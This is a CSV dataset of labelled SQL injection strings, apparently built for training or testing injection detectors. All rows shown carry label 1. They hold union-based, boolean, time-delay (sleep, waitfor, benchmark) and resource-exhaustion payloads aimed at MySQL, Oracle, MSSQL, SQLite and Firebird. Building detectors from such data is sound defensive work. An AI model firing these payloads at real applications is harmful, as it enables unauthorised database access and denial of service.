row_index,payload_norm,label,sqli_type_hint
9240,"1%"" and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""%"" = """,1,
9241,"1%"" ) ) ) and 4595 = 4595#",1,
9242,"-2102' where 3644 = 3644 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
9243,-7903 where 6699 = 6699 or 8571 = 8571--,1,
9244,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1,
9245,"-5066' ) ) union all select 9689,9689,9689,9689#",1,
9246,"1'|| ( select 'nfgq' where 1837 = 1837 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
9247,"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""vfoh"" = ""vfoh",1,
9248,1 ) as ztrb where 1052 = 1052 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,
9249,"1%"" ) ) ) union all select null--",1,
9250,"1%' ) ) ) union all select null,null,null,null,null#",1,
9251,"-4692%"" ) ) union all select 1781,1781#",1,
9252,"1"" ) as xrsi where 9498 = 9498",1,
9253,"1%"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""%"" = """,1,
9254,"1' ) as myxr where 6299 = 6299 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
9255,"1' ) as yhgk where 9246 = 9246 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1,
9256,"1"" where 7279 = 7279 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
9257,"1%"" and elt ( 5345 = 8751,8751 ) and ""%"" = """,1,
9258,1 ) ) as xcsm where 9231 = 9231,1,
9259,"1"" ) as vdim where 1296 = 1296",1,
9260,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( '%' = '",1,
9261,"1' ) as viex where 6242 = 6242 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1,
9262,"1"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu )",1,
9263,"1'+ ( select 'sqje' where 1634 = 1634 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'",1,
9264,"1' ) ) as uncy where 8009 = 8009 union all select null,null,null,null,null,null,null,null,null#",1,
9265,1'|| ( select 'avxz' from dual where 7815 = 7815,1,
9266,1'|| ( select 'glyc' from dual where 4058 = 4058,1,
9267,1 ) ) ) waitfor delay '0:0:5' and ( ( ( 3481 = 3481,1,
9268,"1'|| ( select 'ssvp' where 3300 = 3300 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
9269,1' ) as sjij where 8659 = 8659,1,
